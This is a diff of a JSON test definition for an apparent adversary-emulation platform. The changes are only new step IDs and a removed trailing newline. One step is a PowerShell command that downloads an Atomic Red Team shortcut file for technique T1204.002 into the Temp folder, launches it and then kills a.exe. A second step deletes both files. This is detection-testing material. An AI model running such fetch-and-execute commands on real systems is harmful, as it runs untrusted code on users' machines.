@@ -7,16 +7,16 @@
   ],
   "steps": [
     {
-      "id": "f06ec522-f421-4c75-8092-9c21381dcd36",
+      "id": "49a893e5-88e0-4b8f-8258-db97d77840f7",
       "type": "execute-command",
       "data": {
-        "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n",
+        "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "124f088c-0795-43f2-82aa-b42649564ab9",
+      "id": "12e514f1-5f18-40e7-89d6-560067717d18",
       "type": "execute-command",
       "data": {
         "command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "f06ec522-f421-4c75-8092-9c21381dcd36",
+      "s": "49a893e5-88e0-4b8f-8258-db97d77840f7",
       "p": "on-success",
-      "o": "124f088c-0795-43f2-82aa-b42649564ab9"
+      "o": "12e514f1-5f18-40e7-89d6-560067717d18"
     },
     {
-      "s": "f06ec522-f421-4c75-8092-9c21381dcd36",
+      "s": "49a893e5-88e0-4b8f-8258-db97d77840f7",
       "p": "on-failure",
-      "o": "124f088c-0795-43f2-82aa-b42649564ab9"
+      "o": "12e514f1-5f18-40e7-89d6-560067717d18"
     }
   ],
   "tags": [
